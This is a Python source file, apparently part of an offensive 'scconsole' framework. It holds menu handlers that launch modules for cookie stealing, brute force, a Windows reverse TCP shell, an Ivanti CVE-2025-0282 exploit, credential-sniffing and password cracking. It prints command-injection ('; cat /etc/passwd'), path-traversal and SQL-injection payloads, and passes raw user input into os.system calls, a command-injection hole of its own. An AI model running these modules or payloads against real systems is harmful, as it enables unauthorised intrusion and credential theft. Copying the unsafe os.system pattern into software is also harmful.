def aauxiliarydrupalscan():
    scconsole73 = input("sc~" + color.red + "(auxiliary/drupal-scan)" + color.white + ">")
    if scconsole73 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarydrupalscan()
    elif scconsole73 == "clear":
        os.system('clear')
        aauxiliarydrupalscan()
    elif scconsole73 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarydrupalscan()
    elif scconsole73 == "run":
        os.system('python exploits/auxiliary/drupal-scan.py')
        aauxiliarydrupalscan()
    elif scconsole73 == "exploit":
        os.system('python exploits/auxiliary/drupal-scan.py')
        aauxiliarydrupalscan()
    elif scconsole73 == "unuse":
        print("unusing auxiliary/drupal-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole73 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarycookiestolen():
    scconsole75 = input("sc~" + color.red + "(auxiliary/cookie_stolen)" + color.white + ">")
    if scconsole75 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show RESULT ---> shows the result after scan.
""")
        aauxiliarycookiestolen()
    elif scconsole75 == "clear":
        os.system('clear')
        aauxiliarycookiestolen()
    elif scconsole75 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

RESULT        | results of stolen cookies will be saved into cookies.txt.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarycookiestolen()
    elif scconsole75 == "run":
        os.system('python exploits/auxiliary/cookie_stolen.py')
        aauxiliarycookiestolen()
    elif scconsole75 == "exploit":
        os.system('python exploits/auxiliary/cookie_stolen.py')
        aauxiliarycookiestolen()
    elif scconsole75 == "show RESULT":
        os.system('cat cookies.txt')
        aauxiliarycookiestolen()
    elif scconsole75 == "unuse":
        print("unusing auxiliary/cookie_stolen.")
        time.sleep(0.5)
        Console()
    elif scconsole75 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def tAurba501():
    scconsole76 = input("sc~" + color.red + "(site/Aurba-501)" + color.white + ">")
    if scconsole76 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tAurba501()
    elif scconsole76 == "clear":
        os.system('clear')
        tAurba501()
    elif scconsole76 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
USERNAME      | specify the username.
PASSWORD      | specify the password.

you will specifiy these options when you run or exploit it!
""")
        tAurba501()
    elif scconsole76 == "run":
        os.system('python exploits/site/Aurba-501.py')
        tAurba501()
    elif scconsole76 == "exploit":
        os.system('python exploits/site/Aurba-501.py')
        tAurba501()
    elif scconsole76 == "unuse":
        print("unusing site/Aurba-501.")
        time.sleep(0.5)
        Console()
    elif scconsole76 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def tHughesNetHT2000WSatelliteModem():
    scconsole77 = input("sc~" + color.red + "(site/HughesNet-HT2000W-Satellite-Modem)" + color.white + ">")
    if scconsole77 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tHughesNetHT2000WSatelliteModem()
    elif scconsole77 == "clear":
        os.system('clear')
        tHughesNetHT2000WSatelliteModem()
    elif scconsole77 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
PASSWORD      | specify the password to reset.
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        tHughesNetHT2000WSatelliteModem()
    elif scconsole77 == "run":
        passowrdforreset = input("Enter password for reset: ")
        taregturlforreset = input("Target URL: ")
        os.system(f'python exploits/site/HughesNet-HT2000W-Satellite-Modem.py {passowrdforreset} {taregturlforreset}')
        tHughesNetHT2000WSatelliteModem()
    elif scconsole77 == "exploit":
        passowrdforreset2 = input("Enter password for reset: ")
        taregturlforreset2 = input("Target URL: ")
        os.system(f'python exploits/site/HughesNet-HT2000W-Satellite-Modem.py {passowrdforreset2} {taregturlforreset2}')
        tHughesNetHT2000WSatelliteModem()
    elif scconsole77 == "unuse":
        print("unusing site/HughesNet-HT2000W-Satellite-Modem.")
        time.sleep(0.5)
        Console()
    elif scconsole77 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarybasicauth():
    scconsole78 = input("sc~" + color.red + "(auxiliary/basic-auth)" + color.white + ">")
    if scconsole78 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarybasicauth()
    elif scconsole78 == "clear":
        os.system('clear')
        aauxiliarybasicauth()
    elif scconsole78 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
USERNAMELIST  | specify the username list.
PASSWORDLIST  | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarybasicauth()
    elif scconsole78 == "run":
        os.system('python exploits/auxiliary/basic-auth.py')
        aauxiliarybasicauth()
    elif scconsole78 == "exploit":
        os.system('python exploits/auxiliary/basic-auth.py')
        aauxiliarybasicauth()
    elif scconsole78 == "unuse":
        print("unusing auxiliary/basic-auth.")
        time.sleep(0.5)
        Console()
    elif scconsole78 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliaryftpanonymous():
    scconsole79 = input("sc~" + color.red + "(auxiliary/ftp-anonymous)" + color.white + ">")
    if scconsole79 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryftpanonymous()
    elif scconsole79 == "clear":
        os.system('clear')
        aauxiliaryftpanonymous()
    elif scconsole79 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryftpanonymous()
    elif scconsole79 == "run":
        os.system('python exploits/auxiliary/ftp-anonymous.py')
        aauxiliaryftpanonymous()
    elif scconsole79 == "exploit":
        os.system('python exploits/auxiliary/ftp-anonymous.py')
        aauxiliaryftpanonymous()
    elif scconsole79 == "unuse":
        print("unusing auxiliary/ftp-anonymous.")
        time.sleep(0.5)
        Console()
    elif scconsole79 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliaryhttpput():
    scconsole80 = input("sc~" + color.red + "(auxiliary/http_put)" + color.white + ">")
    if scconsole80 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryhttpput()
    elif scconsole80 == "clear":
        os.system('clear')
        aauxiliaryhttpput()
    elif scconsole80 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryhttpput()
    elif scconsole80 == "run":
        os.system('python exploits/auxiliary/http_put.py')
        aauxiliaryhttpput()
    elif scconsole80 == "exploit":
        os.system('python exploits/auxiliary/http_put.py')
        aauxiliaryhttpput()
    elif scconsole80 == "unuse":
        print("unusing auxiliary/http_put.")
        time.sleep(0.5)
        Console()
    elif scconsole80 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarypingmssql():
    scconsole81 = input("sc~" + color.red + "(auxiliary/ping-mssql)" + color.white + ">")
    if scconsole81 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypingmssql()
    elif scconsole81 == "clear":
        os.system('clear')
        aauxiliarypingmssql()
    elif scconsole81 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypingmssql()
    elif scconsole81 == "run":
        os.system('python exploits/auxiliary/ping-mssql.py')
        aauxiliarypingmssql()
    elif scconsole81 == "exploit":
        os.system('python exploits/auxiliary/ping-mssql.py')
        aauxiliarypingmssql()
    elif scconsole81 == "unuse":
        print("unusing auxiliary/ping-mssql.")
        time.sleep(0.5)
        Console()
    elif scconsole81 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarywebdavscanner():
    scconsole82 = input("sc~" + color.red + "(auxiliary/webdav_scanner)" + color.white + ">")
    if scconsole82 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarywebdavscanner()
    elif scconsole82 == "clear":
        os.system('clear')
        aauxiliarywebdavscanner()
    elif scconsole82 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarywebdavscanner()
    elif scconsole82 == "run":
        os.system('python exploits/auxiliary/webdav_scanner.py')
        aauxiliarywebdavscanner()
    elif scconsole82 == "exploit":
        os.system('python exploits/auxiliary/webdav_scanner.py')
        aauxiliarywebdavscanner()
    elif scconsole82 == "unuse":
        print("unusing auxiliary/webdav_scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole82 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarysitemapgenerator():
    scconsole83 = input("sc~" + color.red + "(auxiliary/sitemap-generator)" + color.white + ">")
    if scconsole83 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show RESULT ---> show the result after scan.
""")
        aauxiliarysitemapgenerator()
    elif scconsole83 == "clear":
        os.system('clear')
        aauxiliarysitemapgenerator()
    elif scconsole83 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

RESULT        | results of stolen sitemap will be saved into sitemap.xml.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarysitemapgenerator()
    elif scconsole83 == "run":
        os.system('python exploits/auxiliary/sitemap-generator.py')
        aauxiliarysitemapgenerator()
    elif scconsole83 == "exploit":
        os.system('python exploits/auxiliary/sitemap-generator.py')
        aauxiliarysitemapgenerator()
    elif scconsole83 == "show RESULT":
        os.system('cat sitemap.xml')
        aauxiliarysitemapgenerator()
    elif scconsole83 == "unuse":
        print("unusing auxiliary/webdav_scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole83 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sservercve20250001():
    scconsole84 = input("sc~" + color.red + "(server/cve-2025-0001)" + color.white + ">")
    if scconsole84 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> shows the payloads you can use in this exploit.
""")
        sservercve20250001()
    elif scconsole84 == "clear":
        os.system('clear')
        sservercve20250001()
    elif scconsole84 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
PAYLOAD       | specify the payload.

you will specifiy these options when you run or exploit it!
""")
        sservercve20250001()
    elif scconsole84 == "show payloads":
        print("""
""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.
""")
        sservercve20250001()
    elif scconsole84 == "run":
        os.system('python exploits/server/cve-2025-0001.py')
        sservercve20250001()
    elif scconsole84 == "exploit":
        os.system('python exploits/server/cve-2025-0001.py')
        sservercve20250001()
    elif scconsole84 == "unuse":
        print("unusing server/cve-2025-0001.")
        time.sleep(0.5)
        Console()
    elif scconsole84 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sservercve20250006():
    scconsole85 = input("sc~" + color.red + "(server/cve-2025-0006)" + color.white + ">")
    if scconsole85 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> shows the payloads you can use in this exploit.
""")
        sservercve20250006()
    elif scconsole85 == "clear":
        os.system('clear')
        sservercve20250006()
    elif scconsole85 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
PAYLOAD       | specify the payload.

you will specifiy these options when you run or exploit it!
""")
        sservercve20250006()
    elif scconsole85 == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.
""")
        sservercve20250006()
    elif scconsole85 == "run":
        os.system('python exploits/server/cve-2025-0006.py')
        sservercve20250006()
    elif scconsole85 == "exploit":
        os.system('python exploits/server/cve-2025-0006.py')
        sservercve20250006()
    elif scconsole85 == "unuse":
        print("unusing server/cve-2025-0006.")
        time.sleep(0.5)
        Console()
    elif scconsole85 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def wreversetcp():
    scconsole86 = input("sc~" + color.red + "(windows/reverse_tcp)" + color.white + ">")
    if scconsole86 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wreversetcp()
    elif scconsole86 == "clear":
        os.system('clear')
        wreversetcp()
    elif scconsole86 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specify listener host.
LPORT         | specify listener port.
RHOST         | specify target host.
RPORT         | specify target port.

you will specifiy these options when you run or exploit it!
""")
        wreversetcp()
    elif scconsole86 == "run":
        os.system('python exploits/windows/reverse_tcp.py')
        wreversetcp()
    elif scconsole86 == "exploit":
        os.system('python exploits/windows/reverse_tcp.py')
        wreversetcp()
    elif scconsole86 == "unuse":
        print("unusing windows/reverse_tcp.")
        time.sleep(0.5)
        Console()
    elif scconsole86 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def eexploitCVE20250282IvantiexploitCVE20250282Ivanti():
    scconsole87 = input("sc~" + color.red + "(exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti)" + color.white + ">")
    if scconsole87 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole87 == "clear":
        os.system('clear')
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole87 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target host.
LOCAL_SHELL   | specify the local shell path.

you will specifiy these options when you run or exploit it!
""")
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole87 == "run":
        targetwebip = input("TARGET_IP: ")
        localshellpath = input("LOCAL_SHELL_PATH: ")
        os.system(f'python exploits/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti.py {targetwebip} {localshellpath}')
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole87 == "exploit":
        targetwebip2 = input("TARGET_IP: ")
        localshellpath2 = input("LOCAL_SHELL_PATH: ")
        os.system(f'python exploits/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti.py {targetwebip2} {localshellpath2}')
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole87 == "unuse":
        print("unusing exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti.")
        time.sleep(0.5)
        Console()
    elif scconsole87 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def tDevikav1PathTraversal():
    scconsole88 = input("sc~" + color.red + "(site/Devika-v1-Path-Traversal)" + color.white + ">")
    if scconsole88 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tDevikav1PathTraversal()
    elif scconsole88 == "clear":
        os.system('clear')
        tDevikav1PathTraversal()
    elif scconsole88 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        tDevikav1PathTraversal()
    elif scconsole88 == "run":
        targeturl2333 = input("URL (example: example.com): ")
        os.system(f'python exploits/site/Devika-v1-Path-Traversal.py -t {targeturl2333}')
        tDevikav1PathTraversal()
    elif scconsole88 == "exploit":
        targeturl2334 = input("URL (example: example.com): ")
        os.system(f'python exploits/site/Devika-v1-Path-Traversal.py -t {targeturl2334}')
        tDevikav1PathTraversal()
    elif scconsole88 == "unuse":
        print("unusing site/Devika-v1-Path-Traversal.")
        time.sleep(0.5)
        Console()
    elif scconsole88 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sssniffersniffer():
    scconsole89 = input("sc~" + color.red + "(sniffer/sniffer)" + color.white + ">")
    if scconsole89 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssniffersniffer()
    elif scconsole89 == "clear":
        os.system('clear')
        sssniffersniffer()
    elif scconsole89 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
INTERFACE     | specify interface (eth0, etc).
SAVE_FILE     | specify file name (example: sniffed.pcap)(specify the '.pcap' in the last of file name).

you will specifiy these options when you run or exploit it!
""")
        sssniffersniffer()
    elif scconsole89 == "run":
        os.system('sudo python exploits/sniffer/sniffer.py')
        sssniffersniffer()
    elif scconsole89 == "exploit":
        os.system('sudo python exploits/sniffer/sniffer.py')
        sssniffersniffer()
    elif scconsole89 == "unuse":
        print("unusing sniffer/sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole89 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def pPOSTrequest():
    scconsole90 = input("sc~" + color.red + "(php/POST-request)" + color.white + ">")
    if scconsole90 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        pPOSTrequest()
    elif scconsole90 == "clear":
        os.system('clear')
        pPOSTrequest()
    elif scconsole90 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt upload url.

you will specifiy these options when you run or exploit it!
""")
        pPOSTrequest()
    elif scconsole90 == "run":
        os.system('python exploits/php/POST-request.py')
        pPOSTrequest()
    elif scconsole90 == "exploit":
        os.system('python exploits/php/POST-request.py')
        pPOSTrequest()
    elif scconsole90 == "unuse":
        print("unusing php/POST-request.")
        time.sleep(0.5)
        Console()
    elif scconsole90 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sssniffercredentialcollector():
    scconsole91 = input("sc~" + color.red + "(sniffer/credential-collector)" + color.white + ">")
    if scconsole91 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssniffercredentialcollector()
    elif scconsole91 == "clear":
        os.system('clear')
        sssniffercredentialcollector()
    elif scconsole91 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
INTERFACE     | specify interface (eth0, etc).
SAVE_FILE     | specify file name (example: sniffed.pcap)(specify the '.pcap' in the last of file name).

you will specifiy these options when you run or exploit it!
""")
        sssniffercredentialcollector()
    elif scconsole91 == "run":
        os.system('sudo python exploits/sniffer/credential-collector.py')
        sssniffercredentialcollector()
    elif scconsole91 == "exploit":
        os.system('sudo python exploits/sniffer/credential-collector.py')
        sssniffercredentialcollector()
    elif scconsole91 == "unuse":
        print("unusing sniffer/credential-collector.")
        time.sleep(0.5)
        Console()
    elif scconsole91 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarypasswordcrackingcrackzip():
    scconsole92 = input("sc~" + color.red + "(auxiliary/password_cracking/crack-zip)" + color.white + ">")
    if scconsole92 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole92 == "clear":
        os.system('clear')
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole92 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
ZIP_FILE      | specify the zip file to crack (with exension!).
WORDLIST      | specify the wordlist to crack with it.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole92 == "run":
        os.system('python exploits/auxiliary/password_cracking/crack-zip.py')
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole92 == "exploit":
        os.system('python exploits/auxiliary/password_cracking/crack-zip.py')
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole92 == "unuse":
        print("unusing auxiliary/password_cracking/crack-zip.")
        time.sleep(0.5)
        Console()
    elif scconsole92 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarypasswordcrackingcrackpdf():
    scconsole93 = input("sc~" + color.red + "(auxiliary/password_cracking/crack-pdf)" + color.white + ">")
    if scconsole93 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole93 == "clear":
        os.system('clear')
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole93 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
PDF_FILE      | specify the pdf file to crack (with exension!).
WORDLIST      | specify the wordlist to crack with it.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole93 == "run":
        os.system('python exploits/auxiliary/password_cracking/crack-pdf.py')
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole93 == "exploit":
        os.system('python exploits/auxiliary/password_cracking/crack-pdf.py')
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole93 == "unuse":
        print("unusing auxiliary/password_cracking/crack-pdf.")
        time.sleep(0.5)
        Console()
    elif scconsole93 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarypasswordcrackingcrackrar():
    scconsole94 = input("sc~" + color.red + "(auxiliary/password_cracking/crack-rar)" + color.white + ">")
    if scconsole94 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole94 == "clear":
        os.system('clear')
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole94 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RAR_FILE      | specify the rar file to crack (with exension!).
WORDLIST      | specify the wordlist to crack with it.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole94 == "run":
        os.system('python exploits/auxiliary/password_cracking/crack-rar.py')
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole94 == "exploit":
        os.system('python exploits/auxiliary/password_cracking/crack-rar.py')
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole94 == "unuse":
        print("unusing auxiliary/password_cracking/crack-rar.")
        time.sleep(0.5)
        Console()
    elif scconsole94 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarypasswordcrackingcrackoffice():
    scconsole95 = input("sc~" + color.red + "(auxiliary/password_cracking/crack-office)" + color.white + ">")
    if scconsole95 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole95 == "clear":
        os.system('clear')
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole95 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RAR_FILE      | specify the office file to crack (with exension!).
WORDLIST      | specify the wordlist to crack with it.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole95 == "run":
        officefilename = input("Enter Office file(with exension ---> .docx): ")
        officewordlist = input("Enter path of your wordlist: ")
        os.system(f'python exploits/auxiliary/password_cracking/crack-office.py {officefilename} {officewordlist}')
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole95 == "exploit":
        officefilename2 = input("Enter Office file(with exension ---> .docx): ")
        officewordlist2 = input("Enter path of your wordlist: ")
        os.system(f'python exploits/auxiliary/password_cracking/crack-office.py {officefilename} {officewordlist}')
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole95 == "unuse":
        print("unusing auxiliary/password_cracking/crack-rar.")
        time.sleep(0.5)
        Console()
    elif scconsole95 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sssnifferinspecttraffic():
    scconsole96 = input("sc~" + color.red + "(sniffer/inspect_traffic)" + color.white + ">")
    if scconsole96 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssnifferinspecttraffic()
    elif scconsole96 == "clear":
        os.system('clear')
        sssnifferinspecttraffic()
    elif scconsole96 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
INTERFACE     | specify interface (eth0, etc).

you will specifiy these options when you run or exploit it!
""")
        sssnifferinspecttraffic()
    elif scconsole96 == "run":
        os.system('sudo python exploits/sniffer/inspect_traffic.py')
        sssnifferinspecttraffic()
    elif scconsole96 == "exploit":
        os.system('sudo python exploits/sniffer/inspect_traffic.py')
        sssnifferinspecttraffic()
    elif scconsole96 == "unuse":
        print("unusing sniffer/inspect_traffic.")
        time.sleep(0.5)
        Console()
    elif scconsole96 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarypasswordcrackingcrackwindowshash():
    scconsole97 = input("sc~" + color.red + "(auxiliary/password_cracking/crack-windows-hash)" + color.white + ">")
    if scconsole97 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole97 == "clear":
        os.system('clear')
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole97 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
HASH          | specify the windows hash.
WORDLIST      | specify the wordlist to crack with it.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole97 == "run":
        windowshash = input("Enter Windows Hash: ")
        windowswordlist = input("Enter path of your wordlist: ")
        os.system(f'python exploits/auxiliary/password_cracking/crack-windows-hash.py {windowshash} {windowswordlist}')
